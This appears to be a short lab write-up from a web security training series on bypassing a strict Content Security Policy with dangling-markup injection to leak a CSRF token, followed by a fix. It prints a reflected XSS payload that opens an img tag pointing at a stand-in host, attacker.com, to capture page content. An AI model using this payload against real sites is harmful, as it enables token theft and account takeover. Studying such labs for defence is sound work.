# Lab 25 — Reflected XSS with Strict CSP, Dangling Markup (PRACTITIONER)

## Concept
CSP blocks JS. But unencoded reflection + `img-src *` → dangling markup
exfiltrates CSRF token via image request.

## Payload
```
/?username="><img src='https://attacker.com/capture?x=
```

## Fix
HTML-encode reflected input + `img-src 'self'` in CSP.
